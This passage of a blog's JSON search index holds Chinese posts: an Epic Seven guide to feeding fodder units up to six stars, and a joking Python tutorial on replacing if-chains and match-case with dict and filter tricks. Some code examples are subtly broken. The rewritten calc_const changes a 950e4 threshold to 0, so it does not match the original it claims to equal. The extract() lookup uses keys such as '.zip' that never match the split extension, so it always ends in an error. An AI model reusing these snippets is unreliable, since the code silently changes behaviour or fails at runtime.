\u7684\u5f00\u53d1\u8005\u548c\u7814\u7a76\u4eba\u5458\uff0c\u6ca1\u6709\u4ed6\u4eec\u8fd9\u7bc7\u6587\u7ae0\u5c06\u65e0\u4ece\u4e0b\u624b\uff1b\u4e5f\u611f\u8c22\u6211\u7684\u6bd5\u8bbe\u8001\u5e08\uff0c\u9009\u4e86\u4e00\u4e2a\u8fd9\u6837\u7684\u8bfe\u9898\uff0c\u628a\u6211\u618b\u51fa\u4e86\u4e00\u7bc7\u8fd9\u6837\u7684\u6587\u7ae0\u3002</p>","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/","title":"\u7b2c\u4e03\u53f2\u8bd7\u5347\u516d\u661f\u7684\u6b63\u786e\u7406\u89e3","text":"","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_1","title":"\u7eea\u8bba","text":"","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_2","title":"\u80cc\u666f","text":"<p>\u6709\u7fa4\u53cb\u7528\u4e8c\u661f\u94f6\u72d7\u5582\u4e8c\u661f\u94f6\u72d7\u3002\u6211\u4e00\u770b\u4f60\u8fd9\u4e0d\u592a\u5962\u4f88\u4e86\u561b\uff0c\u4e8e\u662f\u4fbf\u6709\u4e86\u8fd9\u6761\u535a\u5ba2\u3002</p>","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_3","title":"\u672c\u535a\u5ba2\u7684\u884c\u6587\u7ed3\u6784","text":"<p>\u7b2c\u4e8c\u7ae0\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5404\u4e2a\u7d20\u6750\u5728\u5c06\u4e00\u4e2a\u89d2\u8272\u5347\u4e3a\u516d\u661f\u7684\u8fc7\u7a0b\u4e2d\u6240\u62c5\u5f53\u7684\u8eab\u4efd\u3002</p> <p>\u7b2c\u4e09\u7ae0\u624d\u662f\u672c\u535a\u5ba2\u7684\u4e3b\u8981\u90e8\u5206\uff0c\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5c06\u4e00\u4e2a\u89d2\u8272\u5347\u4e3a\u516d\u661f\u7684\u6700\u7b80\u6d01\u65b9\u6cd5\u3002</p> <p>\u7b2c\u56db\u7ae0\u4e3b\u8981\u4ecb\u7ecd\u4e86\u4e24\u79cd\u5feb\u901f\u83b7\u53d6\u4e8c\u661f\u72d7\u7cae\u7684\u65b9\u6cd5\u3002</p>","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_4","title":"\u5404\u4e2a\u7d20\u6750\u7684\u8eab\u4efd","text":"<p>\u8fd9\u7ae0\u4e3b\u8981\u4ecb\u7ecd\u5404\u4e2a\u7d20\u6750\uff08\u72d7/\u72d7\u7cae\uff09\u5728\u5c06\u4e00\u4e2a\u89d2\u8272\u5347\u4e3a\u516d\u661f\u7684\u8fc7\u7a0b\u4e2d\u6240\u62c5\u5f53\u7684\u8eab\u4efd\u3002</p>","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_5","title":"\u4e8c\u661f\u72d7\u7cae\uff08\u521d\u59cb\uff09","text":"<p>\u4ec0\u4e48\u662f\u4e8c\u661f\u72d7\u7cae\uff1f</p> <p>\u4e8c\u661f\u72d7\u7cae\u5c31\u662f\u5192\u9669\u8fc7\u7a0b\u4e2d\u6389\u843d\u7684\u4e8c\u661f\u5c0f\u602a\uff0c\u7b49\u7ea7\u4e00\u822c\u4e3a 1\u3002</p> <p>\u5982\u679c\u662f\u4ece\u53cb\u60c5\u53ec\u5524\u90a3\u91cc\u62bd\u6765\u7684\uff0c\u90a3\u4e48\u521d\u59cb\u7b49\u7ea7\u4e3a 5\u3002</p> <p></p> <p>\u4e8c\u661f\u72d7\u7cae\u76ee\u524d\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e24\u4e2a\u51fa\u8def\uff1a</p> <ul> <li>\u76f4\u63a5\u5582\u7ed920 \u7ea7\u7684\u4e8c\u661f\u94f6\u72d7\uff08\u6ee1\u7ea7\u7684\u521d\u59cb\u94f6\u72d7\uff09\uff0c\u4f7f\u8fd9\u4e2a20 \u7ea7\u7684\u4e8c\u661f\u94f6\u72d7\u53d8\u621021 \u7ea7\u7684\u4e09\u661f\u94f6\u72d7\u3002    </li> <li>\u81ea\u5df1\u5403\u4f01\u9e45\uff0c\u4f7f\u81ea\u5df1\u53d8\u621020 \u7ea7\u7684\u4e8c\u661f\u72d7\u7cae\uff0c\u7136\u540e\u901a\u8fc7\u5403\u6389\u4e24\u4e2a\u4e8c\u661f\u72d7\u7cae\uff0c\u4f7f\u81ea\u5df1\u6210\u4e3a21 \u7ea7\u7684\u4e09\u661f\u72d7\u7cae\u3002    </li> </ul>","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#21","title":"\u4e09\u661f\u72d7\u7cae\uff0821 \u7ea7\uff09","text":"<p>\u4e09\u661f\u72d7\u7cae\u552f\u4e00\u7684\u83b7\u53d6\u65b9\u6cd5\u5728\u4e0a\u4e00\u8282\u4e2d\u5df2\u7ecf\u4ecb\u7ecd\u8fc7\u4e86\uff0c\u5c31\u662f\u4e8c\u661f\u72d7\u7cae\u81ea\u5df1\u5403\u6389\u540c\u7c7b\u3002</p> <p>\u4e09\u661f\u72d7\u7cae\u76ee\u524d\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e24\u4e2a\u51fa\u8def\uff1a</p> <ul> <li>\u76f4\u63a5\u5582\u7ed930 \u7ea7\u7684\u4e09\u661f\u94f6\u72d7\uff08\u6ee1\u7ea7\u7684\u4e09\u661f\u94f6\u72d7\uff09\uff0c\u4f7f\u8fd9\u4e2a30 \u7ea7\u7684\u4e09\u94f6\u91d1\u72d7\u53d8\u621031 \u7ea7\u7684\u56db\u661f\u94f6\u72d7\u3002    </li> <li>\u76f4\u63a5\u5582\u7ed930 \u7ea7\u7684\u4e09\u661f\u91d1\u72d7\uff08\u6ee1\u7ea7\u7684\u521d\u59cb\u91d1\u72d7\uff09\uff0c\u4f7f\u8fd9\u4e2a30 \u7ea7\u7684\u4e09\u661f\u91d1\u72d7\u53d8\u621031 \u7ea7\u7684\u56db\u661f\u91d1\u72d7\u3002    </li> </ul>","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_6","title":"\u4e8c\u661f\u94f6\u72d7\uff08\u521d\u59cb\uff09","text":"<p>\u4e8c\u661f\u94f6\u72d7\u7684\u552f\u4e00\u4efb\u52a1\u5c31\u662f\u60f3\u529e\u6cd5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u53d8\u621031 \u7ea7\u7684\u56db\u661f\u94f6\u72d7\u3002</p> <p>\u90a3\u4e48\u7b2c\u4e00\u6b65\uff0c\u5c31\u662f\u901a\u8fc7\u5403\u6389 2 \u4e2a\u4e8c\u661f\u72d7\u7cae\uff0c\u628a\u81ea\u5df1\u53d8\u621021 \u7ea7\u7684\u4e09\u661f\u94f6\u72d7\u3002</p> <p></p>","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#21_1","title":"\u4e09\u661f\u94f6\u72d7\uff0821 \u7ea7\uff09","text":"<p>21\u7ea7 \u7684\u4e09\u661f\u94f6\u72d7\u7684\u552f\u4e00\u4efb\u52a1\u5c31\u662f\u5582\u4f01\u9e45\u53d8\u621030 \u7ea7\u7684\u4e09\u661f\u94f6\u72d7\uff08\u6ee1\u7ea7\u7684\u4e09\u661f\u94f6\u72d7\uff09\uff0c\u7136\u540e\u901a\u8fc7\u5403\u6389 3 \u4e2a\u4e09\u661f\u72d7\u7cae\uff0c\u4f7f\u81ea\u5df1\u6210\u4e3a31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7\u3002</p> <p></p>","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#31","title":"\u56db\u661f\u94f6\u72d7\uff0831 \u7ea7\uff09","text":"<p>31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7\u76ee\u524d\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e24\u4e2a\u51fa\u8def\uff1a</p> <ul> <li>\u5582\u7ed9\u4f60\u60f3\u8981\u7684\u521d\u59cb\u56db\u661f\u89d2\u8272\uff0c\u8ba9\u5979\u53d8\u6210\u4e94\u661f\uff0c\u4efb\u52a1\u5c31\u6b64\u7ec8\u7ed3\uff08\u5f53\u7136\u672c\u6587\u63a2\u8ba8\u7684\u662f\u600e\u4e48\u5347\u516d\u661f\uff09\u3002</li> <li>\u5582\u7ed940 \u7ea7\u7684\u56db\u661f\u91d1\u72d7\uff08\u6ee1\u7ea7\u7684\u56db\u661f\u91d1\u72d7\uff09\uff0c\u4f7f\u8fd9\u4e2a\u91d1\u72d7\u53d8\u621041 \u7ea7\u7684\u4e94\u661f\u91d1\u72d7\u3002    </li> </ul>","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_7","title":"\u4e09\u661f\u91d1\u72d7\uff08\u521d\u59cb\uff09","text":"<p>\u4e09\u661f\u91d1\u72d7\u7684\u552f\u4e00\u4efb\u52a1\u5c31\u662f\u60f3\u529e\u6cd5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u53d8\u621041 \u7ea7\u7684\u4e94\u661f\u94f6\u72d7</p> <p>\u90a3\u4e48\u7b2c\u4e00\u6b65\uff0c\u5c31\u662f\u901a\u8fc7\u5403\u6389 3 \u4e2a21 \u7ea7\u7684\u4e09\u661f\u72d7\u7cae\uff0c\u628a\u81ea\u5df1\u53d8\u621031 \u7ea7\u7684\u56db\u661f\u91d1\u72d7</p> <p></p>","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#31_1","title":"\u56db\u661f\u91d1\u72d7\uff0831 \u7ea7\uff09","text":"<p>31 \u7ea7\u7684\u56db\u661f\u91d1\u72d7\u76ee\u524d\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e24\u4e2a\u51fa\u8def\uff1a</p> <ul> <li>\u5582\u7ed9\u4f60\u60f3\u8981\u7684\u521d\u59cb\u56db\u661f\u89d2\u8272\uff0c\u8ba9\u5979\u53d8\u6210\u4e94\u661f\uff0c\u4efb\u52a1\u5c31\u6b64\u7ec8\u7ed3\uff08\u8fd9\u4e00\u70b9\u548c31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7\u4e00\u6a21\u4e00\u6837\uff09\u3002</li> <li>\u901a\u8fc7\u5403\u4f01\u9e45\uff0c\u628a\u81ea\u5df1\u53d8\u621040 \u7ea7\u7684\u56db\u661f\u91d1\u72d7\uff0c\u7136\u540e\u901a\u8fc7\u5403\u6389 4 \u4e2a31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7\uff0c\u4f7f\u81ea\u5df1\u6210\u4e3a41 \u7ea7\u7684\u4e94\u661f\u91d1\u72d7\u3002    </li> </ul>","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#40","title":"\u56db\u661f\u9ed1\u72d7\uff0840 \u7ea7\uff09","text":"<p>\u540c31 \u7ea7\u7684\u56db\u661f\u91d1\u72d7\uff0c\u5582\u621041 \u7ea7\u7684\u4e94\u661f\u9ed1\u72d7</p> <p></p>","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_8","title":"\u6240\u6709\u7684\u4e94\u661f\u72d7","text":"<p>\u7528\u6765\u7ed9\u4f60\u7684\u89d2\u8272\u5347\u516d\u661f\u3002</p>","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_9","title":"\u5982\u4f55\u5feb\u901f\u5347\u516d\u661f\uff1f","text":"<p>\u8fd9\u624d\u662f\u8fd9\u7bc7\u535a\u5ba2\u7684\u4e3b\u8981\u90e8\u5206\u3002</p>","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_10","title":"\u6750\u6599\u51c6\u5907","text":"<p>\u9996\u5148\u53bb\u51c6\u5907\u975e\u5e38\u591a\u7684\u4e8c\u661f\u72d7\u7cae\uff08\u5177\u4f53\u65b9\u6cd5\u770b\u7b2c\u56db\u7ae0\u4ecb\u7ecd\uff09\u3001\u521d\u59cb\u94f6\u72d7\u3001\u521d\u59cb\u91d1\u72d7\u548c\u975e\u5e38\u591a\u4f01\u9e45\u3002</p>","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_11","title":"\u5904\u7406\u4e8c\u661f\u72d7\u7cae","text":"<p>\u5c06\u4f60\u7684\u4e8c\u661f\u72d7\u7cae\u5206\u6210\u4e24\u90e8\u5206\uff0c</p> <p>\u4e00\u90e8\u5206\u7528\u6765\u505a\u8fd9\u4e2a\uff1a</p> <p></p> <p>\u5269\u4e0b\u7684\u62ff\u6765\u505a\u8fd9\u4e2a\uff08\u8fd9\u91cc\u7684\u6d88\u8017\u4f1a\u5f88\u591a\uff0c\u6ce8\u610f\uff09\uff1a</p> <p></p> <p>\u73b0\u5728\uff0c\u4f60\u62e5\u6709\u4e86\u5f88\u591a\u4e09\u661f\u72d7\u7cae\u548c21 \u7ea7\u7684\u4e09\u661f\u94f6\u72d7</p> <p>\u628a\u8fd9\u4e9b\u4e09\u661f\u94f6\u72d7\u5168\u90e8\u5347\u5230 30 \u7ea7\uff08\u5efa\u8bae\u7528 1 \u4e2a\u4f20\u8bf4\u4f01\u9e45\uff09\uff1a</p> <p></p> <p>\u7136\u540e\u7528\u4e00\u4e9b\u4e09\u661f\u72d7\u7cae\u6765\u5582\u4ed6\uff1a</p> <p></p> <p>\u7136\u540e\u628a\u4f60\u5269\u4e0b\u7684\u4e09\u661f\u72d7\u7cae\u5168\u90e8\u5582\u7ed9\u521d\u59cb\u91d1\u72d7\uff1a</p> <p></p> <p>\u73b0\u5728\u6240\u6709\u7684\u4e8c\u661f\u72d7\u7cae\u5e94\u5f53\u5df2\u88ab\u5904\u7406\u5b8c\u6bd5\uff0c\u63a5\u4e0b\u6765\u5df2\u7ecf\u6ca1\u6709\u4ed6\u7684\u4e8b\u4e86\u3002</p> <p>\u6700\u590d\u6742\u7684\u90e8\u5206\u5df2\u7ecf\u9610\u8ff0\u5b8c\u6bd5\uff0c\u63a5\u4e0b\u6765\u7684\u662f\u975e\u5e38\u7b80\u5355\u7684\u5185\u5bb9</p>","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_12","title":"\u5236\u9020\u4e94\u661f\u91d1\u72d7\uff08\u6216\u8005\u9ed1\u72d7\uff09","text":"<p>\u628a\u6240\u6709\u768431 \u7ea7\u7684\u56db\u661f\u91d1\u72d7\u5582\u4f01\u9e45\uff0c\u5582\u5230\u6ee1\u7ea7\uff08\u5efa\u8bae\u7528 1 \u4e2a\u4f20\u8bf4\u4f01\u9e45 + 2 \u4e2a\u521d\u59cb\u4f01\u9e45\uff09\uff1a</p> <p></p> <p>\u7136\u540e\u7528\u521a\u521a\u505a\u597d\u768431 \u7ea7\u7684\u56db\u661f\u94f6\u72d7\u6765\u5582\u4ed6\uff1a</p> <p></p> <p>\u521d\u59cb\u9ed1\u72d7\u5728\u6b64\u65f6\u53d1\u6325\u4f5c\u7528\uff0c\u540c\u6837\u752831 \u7ea7\u7684\u56db\u661f\u94f6\u72d7\u6765\u5582\u4ed6\uff1a</p> <p></p> <p>\u5982\u6cd5\u70ae\u5236\uff0c\u9020 5 \u4e2a\u8fd9\u6837\u7684\u4e94\u661f\u91d1\uff08\u9ed1\uff09\u72d7\u5373\u53ef\u3002</p>","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_13","title":"\u4e8c\u661f\u72d7\u7cae\u7684\u83b7\u53d6\u65b9\u5f0f","text":"<p>\u7531\u4e8e\u94f6\u72d7\u548c\u4f01\u9e45\u7684\u83b7\u53d6\u65b9\u5f0f\u8fc7\u4e8e\u7b80\u5355\uff0c\u800c\u91d1\u72d7\u548c\u9ed1\u72d7\u7684\u83b7\u53d6\u65b9\u5f0f\u8fc7\u4e8e\u56f0\u96be\uff0c\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd\u4e8c\u661f\u72d7\u7cae\u7684\u83b7\u53d6\u65b9\u5f0f\u3002</p> <p>\u6709\u4e3b\u8981\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\uff1a</p>","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_14","title":"\u5237\u5192\u9669","text":"<p>\u4e2a\u4eba\u63a8\u8350\u5237\u666e\u901a\u96be\u5ea6\u7684 9-4\uff08E1-9-1-4\uff08\u7d6e\u8bed\u68ee\u6797\uff09\uff09\u3002\u8fd9\u4e2a\u8ff7\u5bab\u7684\u597d\u5904\u5c31\u662f\uff0c\u8d70\u5b8c\u4e00\u904d\u8def\u5f84\u521a\u597d\u53ef\u4ee5\u7528\u5b8c 50 \u4f53\u529b\u3002</p> <p></p> <p>\u7528\u8fd9\u4e2a\u65b9\u5f0f\uff0c\u57fa\u672c\u4e0a\u662f 10 \u4f53\u529b\u6362\u5927\u6982 2~4 \u4e2a\u4e8c\u661f\u72d7\u7cae\uff0c\u8fd8\u662f\u5f88\u8d5a\u7684\u3002</p> \u6e29\u99a8\u63d0\u793a <p>\u4f46\u662f\u957f\u65f6\u95f4\u5237\u8ff7\u5bab\u5efa\u8bae\u7528\u811a\u672c\u5237\uff0c\u4e0d\u7136\u771f\u7684\u7eaf\u5c5e\u7cbe\u795e\u6c61\u67d3\u3002\ud83e\udd2e</p> <p>\u6216\u8005\u5237\u5f53\u524d\u6d3b\u52a8\u7684\u652f\u7ebf\uff0c\u4e5f\u662f\u4e2a\u4e0d\u9519\u7684\u9009\u62e9\u3002</p>","tags":["epic7"]},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_15","title":"\u53cb\u60c5\u4e66\u7b7e\u6362","text":"","tags":["epic7"]},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/","title":"\u5982\u4f55\u5c06 Python \u5199\u6210\u6587\u8a00\u6587","text":"","tags":["python"]},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/#_1","title":"\u7eea\u8bba","text":"<p>\u4fd7\u8bdd\u8bf4\u5f97\u597d\uff1a</p> <p>\u201c\u7528 Python \u5199\u7a0b\u5e8f\u5c31\u50cf\u662f\u7528\u767d\u8bdd\u5199\u4f5c\u6587\u3002\u201d</p> <p>\u65e2\u7136\u5982\u6b64\uff0c\u4e3a\u4f55\u4e0d\u8bd5\u4e00\u8bd5\u5c06 Python \u5199\u6210\u6587\u8a00\u6587\u5462\uff1f\u5bf9\u4e8e\u4e00\u4e2a\u50cf Python \u8fd9\u6837\u5177\u6709\u4e30\u5bcc\u8bed\u6cd5\u7cd6\u7684\u89e3\u91ca\u578b\u8bed\u8a00\u6765\u8bf4\uff0c\u5c06\u5176\u5199\u6210\u6587\u8a00\u6587\u662f\u4e00\u4ef6\u975e\u5e38\u5bb9\u6613\u4e14\u6709\u8da3\u7684\u4e8b\u60c5\u3002\u4e5f\u6b63\u5982\u67d0\u4eba\u6240\u8bf4\uff1a</p> <p>\u201c\uff08\u6587\u5b66\u610f\u4e49\u4e0a\u7684\uff09\u6587\u8a00\u6587\u4f55\u5c1d\u4e0d\u5c31\u662f\u4e00\u4e2a\u8bed\u6cd5\u7cd6\u7684\u5408\u96c6\u5462\uff1f\u201d</p> <p>\u672c\u7bc7\u535a\u5ba2\u7684\u610f\u4e49\uff0c\u4fbf\u662f\u4ecb\u7ecd\u5982\u4f55\u5229\u7528\u5404\u79cd\u8bed\u6cd5\u7cd6\uff0c\u5c06 Python \u5199\u6210\u6587\u8a00\u6587\u3002\u5f53\u7136\uff0c\u5982\u679c\u4f60\u60f3\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u7528\u8fd9\u79cd\u5199\u6cd5\u5199 Python \u7a0b\u5e8f\uff0c\u7406\u8bba\u4e0a\u4e5f\u4e0d\u662f\u4e0d\u884c\uff0c\u4f46\u662f\u4f60\u771f\u7684\u89c1\u8fc7\u6709\u4eba\u5728\u81ea\u5df1\u7684\u6587\u7ae0\u91cc\u5199\u4e00\u5927\u5806\u6587\u8a00\u6587\u5417\uff1f</p>","tags":["python"]},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/#_2","title":"\u5199\u6cd5\u793a\u8303","text":"<p>\u4e3a\u4e86\u66f4\u597d\u5730\u8fd0\u7528\u8bed\u6cd5\u7cd6\uff0c\u672c\u535a\u5ba2\u6d89\u53ca\u5230\u7684\u6240\u6709 Python \u7248\u672c\u5747\u4e3a Python 3.10\u3002</p>","tags":["python"]},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/#1-filter-if-elif-else","title":"1. \u4f7f\u7528 <code>filter()</code> \u51fd\u6570\u53d6\u4ee3 <code>if-elif-else</code> \u5224\u65ad\u94fe","text":"<p>\u73b0\u4ee3\u6587\uff1a</p> <pre><code>def calc_const(score: int | float, rating: float) -&gt; float | None:\n    if rating == 0:\n        const = None\n    elif score &gt;= 1000e4:\n        const = rating - 2\n    elif score &gt;= 980e4:\n        const = rating - 1 - (score - 980e4) / 20e4\n    elif score &gt;= 950e4:\n        const = rating - (score - 950e4) / 30e4\n    else:\n        const = None\n\n    return const\n</code></pre> <p>\u6587\u8a00\u6587\uff1a</p> <pre><code>def calc_const(score: int | float, rating: float) -&gt; float | None:\n    const_pattern: list[tuple[bool, float | None]] = [\n        (rating == 0, None),  # if rating == 0: const = None\n        (score &gt;= 1000e4, rating - 2),  # elif score &gt;= 1000e4: const = rating - 2\n        (score &gt;= 980e4, rating - 1 - (score - 980e4) / 20e4),\n        (score &gt;= 0, rating - (score - 950e4) / 30e4),\n        (True, None),  # else: const = None\n    ]\n\n    return if_pattern(const_pattern)\n\n\ndef if_pattern(pattern: list[tuple[bool, _T]]) -&gt; _T:\n    return filter(lambda x: x[0], pattern).__next__()[1]\n</code></pre> <p>\u4e4d\u4e00\u770b\uff0c\u6587\u8a00\u6587\u7248\u672c\u4f3c\u4e4e\u6bd4\u73b0\u4ee3\u6587\u7248\u672c\u66f4\u957f\u4e00\u4e9b\uff0c\u5176\u5b9e\u4e0d\u7136\uff0c\u5982\u679c\u6211\u4eec\u5c06 <code>if_pattern()</code> \u51fd\u6570\u5408\u5e76\u5230 <code>calc_const()</code> \u51fd\u6570\u4e2d\uff0c\u90a3\u4e48\u6587\u8a00\u6587\u7248\u672c\u5c31\u4f1a\u66f4\u77ed\u4e00\u4e9b\u3002\u5e76\u4e14\u7531\u4e8e\u5ef6\u957f\u4e00\u4e2a\u5224\u65ad\u9879\uff0c\u73b0\u4ee3\u6587\u7248\u672c\u9700\u8981\u589e\u52a0\u4e24\u884c\uff0c\u800c\u6587\u8a00\u6587\u7248\u672c\u53ea\u9700\u8981\u4e00\u884c\uff0c\u6240\u4ee5\u5f53\u5224\u65ad\u94fe\u5f88\u957f\u65f6\uff0c\u6587\u8a00\u6587\u7248\u672c\u4f1a\u66f4\u77ed\u4e00\u4e9b\u3002</p> <p>\u8fd9\u4e2a\u6587\u8a00\u6587\u7248\u672c\u7684\u552f\u4e00\u7f3a\u70b9\u662f\uff0c\u5f53\u8fdb\u5165 <code>calc_const()</code> \u51fd\u6570\u65f6\uff0c\u9700\u8981\u8ba1\u7b97 <code>const_pattern</code> \u91cc\u6240\u6709\u5e03\u5c14\u8868\u8fbe\u5f0f\u7684\u503c\uff0c\u56e0\u6b64\u5728\u6027\u80fd\u4e0a\u53ef\u80fd\u4f1a\u7a0d\u7a0d\u900a\u8272\u4e8e\u73b0\u4ee3\u6587\u7248\u672c\u3002</p>","tags":["python"]},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/#2-dictget-match-case","title":"2. \u4f7f\u7528 <code>dict.get()</code> \u65b9\u6cd5\u53d6\u4ee3 <code>match-case</code> \u6a21\u5f0f\u5339\u914d","text":"<p>\u73b0\u4ee3\u6587\uff1a</p> <pre><code>def return_relation_between_vn(relation: str) -&gt; str:\n    match relation:\n        case 'seq':\n            return '\u3000\u7eed\u4f5c\u3000'\n        case 'preq':\n            return '\u3000\u524d\u4f5c\u3000'\n        case 'set':\n            return '\u540c\u4e00\u8bbe\u5b9a'\n        case 'alt':\n            return '\u66ff\u4ee3\u7248\u672c'\n        case 'char':\n            return '\u89d2\u8272\u5ba2\u4e32'\n        case 'side':\n            return '\u652f\u7ebf\u6545\u4e8b'\n        case 'par':\n            return '\u4e3b\u7ebf\u5267\u60c5'\n        case 'ser':\n            return '\u540c\u4e00\u7cfb\u5217'\n        case 'fan':\n            return 'FanDisc'\n        case 'orig':\n            return '\u3000\u539f\u4f5c\u3000'\n        case _:\n            return '\u672a\u77e5'\n</code></pre> <p>\u6587\u8a00\u6587\uff1a</p> <pre><code>def return_relation_between_vn(relation: str) -&gt; str:\n    return {\n        'seq': '\u3000\u7eed\u4f5c\u3000',  # Sequel\n        'preq': '\u3000\u524d\u4f5c\u3000',  # Prequel\n        'set': '\u540c\u4e00\u8bbe\u5b9a',  # Same setting\n        'alt': '\u66ff\u4ee3\u7248\u672c',  # Alternative version\n        'char': '\u89d2\u8272\u5ba2\u4e32',  # Shares characters\n        'side': '\u652f\u7ebf\u6545\u4e8b',  # Side story\n        'par': '\u4e3b\u7ebf\u5267\u60c5',  # Parent story\n        'ser': '\u540c\u4e00\u7cfb\u5217',  # Same series\n        'fan': 'FanDisc',  # Fandisc\n        'orig': '\u3000\u539f\u4f5c\u3000',  # Original game\n    }.get(relation, '\u672a\u77e5')\n</code></pre> <p>\u7531\u4e8e PEP 8 \u4e0d\u5141\u8bb8\u6211\u4eec\u5c06\u591a\u4e2a\u58f0\u660e\u5199\u5728\u540c\u4e00\u884c\u4e0a\uff08<code>PEP 8: E701 multiple statements on one line (colon)</code>\uff09\uff0c\u6545\u73b0\u4ee3\u6587\u7248\u672c\u5c06\u660e\u663e\u6bd4\u6587\u8a00\u6587\u7248\u672c\u5360\u636e\u66f4\u591a\u7684\u884c\u6570\u3002</p> <p>\u5728 Python \u7248\u672c\u4f4e\u4e8e 3.10 \u7684\u60c5\u51b5\u4e0b\uff0c\u7531\u4e8e\u65e0\u6cd5\u4f7f\u7528 <code>match-case</code> \u6a21\u5f0f\u5339\u914d\uff08PEP 634: Structural Pattern Matching\uff09\uff0c\u8fd9\u5c06\u5bfc\u81f4\u53ea\u80fd\u964d\u7ea7\u4f7f\u7528 <code>if-elif-else</code> \u5224\u65ad\u94fe\u8fdb\u884c\u94fe\u5f0f\u5224\u65ad\u3002</p> <p>\u540c\u7406\uff0c\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>dict.get()</code> \u65b9\u6cd5\u6267\u884c\u4e00\u4e9b\u51fd\u6570\uff0c\u4f8b\u5982\uff1a</p> <pre><code>def extract(path: str) -&gt; None:\n    return {\n        '.zip': pyzipper.ZipFile,\n        '.7z': py7zr.SevenZipFile,\n        '.rar': rarfile.RarFile,\n    }.get(path.split('.')[-1], None).extractall(path)\n</code></pre> <p>\u751a\u81f3\u4f7f\u7528 <code>lambda</code> \u8868\u8fbe\u5f0f\u4f5c\u4e3a\u51fd\u6570\uff1a</p> <pre><code>Numeric = Union[int, float, complex, np.number]\n\ndef calc(a: Numeric, b: Numeric, op: str) -&gt; Optional[Numeric]:\n    return {\n        '+': lambda: a + b,\n        '-': lambda: a - b,\n        '*': lambda: a * b,\n        '/': lambda: a / b,\n        '%': lambda: a % b,\n        '**': lambda: a ** b,\n        '//': lambda: a // b,\n    }.get(op, lambda: None)()\n</code></pre>","tags":["python"]},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/#3-pass","title":"3. \u4f7f\u7528 <code>...</code> \u65b9\u6cd5\u53d6\u4ee3 <code>pass</code> \u8bed\u53e5","text":"<p>\u73b0\u4ee3\u6587\uff1a</p> <pre><code>try:\n    a = 1 / 0\nexcept ZeroDivisionError:\n    pass\n</code></pre> <p>\u6587\u8a00\u6587\uff1a</p> <pre><code>try:\n    a = 1 / 0\nexcept ZeroDivisionError:\n    ...\n</code></pre> <p>\u9996\u5148\uff0c\u8fd9\u4e24\u6bb5\u4ee3\u7801\u7684\u6548\u679c\u662f\u4e00\u6a21\u4e00\u6837\u7684\u3002</p> <p>\u90a3\u4e48\uff0c<code>...</code> \u5230\u5e95\u662f\u4e2a\u4ec0\u4e48\u4e1c\u897f\u5462\uff1f\u53ef\u4ee5\u8bd5\u4e00\u8bd5 <code>type(...)</code>\uff0c\u4f60\u4f1a\u53d1\u73b0\u5b83\u8fd4\u56de\u7684\u662f <code>&lt;class 'ellipsis'&gt;</code>\u3002\u8fd9\u4e2a\u4e1c\u897f\u7684\u5177\u4f53\u7528\u9014\u53ef\u4ee5\u89c1 Built-in Constants - Ellipsis \u6216 What does the Ellipsis object do?</p> <p>\u867d\u7136\u770b\u4e0a\u53bb\u6ca1\u6709\u4ec0\u4e48\u7528\uff0c\u4f46\u5176\u5b9e <code>...</code> \u76f8\u5f53\u4e8e\u4e00\u4e2a\u8bed\u6c14\u8bcd\uff0c\u4e5f\u662f\u67d0\u952e\u76d8\u624b\u7684\u8457\u540d\u540d\u8a00\u3002\u4f60\u53ef\u4ee5\u5c06\u5176\u653e\u5230\u67d0\u4e9b\u7279\u5b9a\u7684 <code>except</code> \u8bed\u53e5\u5757\u4e2d\uff0c\u8868\u793a\u4f60\u5bf9\u629b\u51fa\u7684\u8fd9\u4e2a\u5f02\u5e38\u5341\u5206\u65e0\u8bed\u3002\u4f8b\u5982\uff1a</p> <pre><code>try:\n    result = await get_user_best35(user_id)\nexcept (\n    socket.timeout,\n    aiohttp.client_exceptions.ClientConnectionError,\n    aiohttp.WSServerHandshakeError,\n):\n    